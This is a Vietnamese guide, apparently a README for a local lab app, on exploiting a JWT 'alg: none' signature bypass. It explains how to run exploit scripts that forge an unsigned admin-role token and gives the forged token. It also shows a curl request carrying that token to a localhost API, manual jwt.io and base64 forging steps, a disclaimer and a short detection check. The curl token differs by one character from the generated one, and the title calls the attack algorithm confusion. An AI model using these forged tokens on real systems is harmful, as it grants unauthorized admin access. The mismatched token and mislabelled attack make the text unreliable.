# Hướng Dẫn Khai Thác Lỗ Hổng JWT Algorithm Confusion

## Yêu Cầu

### Cho Python Script:
```bash
# Không cần cài đặt thêm, sử dụng thư viện chuẩn
python3 exploit_token.py
```

### Cho Node.js Script:
```bash
# Không cần cài đặt thêm, sử dụng thư viện chuẩn của Node.js
node exploit_token.js
```

## Cách Sử Dụng

### Python Script

```bash
# Cách 1: Chạy interactive
python3 exploit_token.py

# Cách 2: Truyền arguments
python3 exploit_token.py <userId> <role>

# Ví dụ:
python3 exploit_token.py 507f1f77bcf86cd799439011 admin
```

### Node.js Script

```bash
# Cách 1: Chạy với giá trị mặc định
node exploit_token.js

# Cách 2: Truyền arguments
node exploit_token.js <userId> <role>

# Ví dụ:
node exploit_token.js 507f1f77bcf86cd799439011 admin
```

## Ví Dụ Khai Thác

### Bước 1: Tạo Token Giả Mạo

```bash
# Tạo token với role admin
python3 exploit_token.py 507f1f77bcf86cd799439011 admin
```

Output sẽ là:
```
============================================================
TOKEN GIẢ MẠO ĐÃ ĐƯỢC TẠO:
============================================================
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJyb2xlIjoiYWRtaW4ifQ.
```

### Bước 2: Sử Dụng Token

#### Với cURL:
```bash
curl -X GET http://localhost:3000/api/v1/users/current \
  -H "Authorization: Bearer eyJhbGciOiJub25eIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJyb2xlIjoiYWRtaW4ifQ."
```

#### Với Postman/Insomnia:
1. Mở request
2. Tab "Authorization"
3. Chọn "Bearer Token"
4. Paste token vào

### Bước 3: Kiểm Tra Kết Quả

Nếu thành công, bạn sẽ nhận được response với thông tin user và có thể truy cập các endpoint yêu cầu quyền admin.

## Tạo Token Thủ Công

### Sử dụng jwt.io

1. Truy cập https://jwt.io
2. Trong phần "HEADER", thay đổi:
   ```json
   {
     "alg": "none",
     "typ": "JWT"
   }
   ```
3. Trong phần "PAYLOAD", nhập:
   ```json
   {
     "userId": "507f1f77bcf86cd799439011",
     "role": "admin",
     "iat": 1234567890,
     "exp": 9999999999
   }
   ```
4. Xóa phần signature (để trống)
5. Copy token ở bên trái

### Sử dụng Online Base64 Encoder

1. Encode header:
   ```json
   {"alg":"none","typ":"JWT"}
   ```
   → `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

2. Encode payload:
   ```json
   {"userId":"507f1f77bcf86cd799439011","role":"admin"}
   ```
   → `eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJyb2xlIjoiYWRtaW4ifQ`

3. Kết hợp: `header.payload.` (chú ý dấu chấm cuối)

## Lưu Ý

⚠️ **CẢNH BÁO**: Lỗ hổng này chỉ được tạo ra cho mục đích giáo dục và báo cáo bảo mật. Không sử dụng để tấn công các hệ thống thực tế mà không có sự cho phép.

## Kiểm Tra Lỗ Hổng

Để kiểm tra xem hệ thống có lỗ hổng này không:

1. Tạo token với algorithm "none" như hướng dẫn trên
2. Gửi request với token đó
3. Nếu request thành công → Hệ thống có lỗ hổng
4. Nếu nhận được lỗi "Invalid token" hoặc "Algorithm not allowed" → Hệ thống đã được bảo vệ

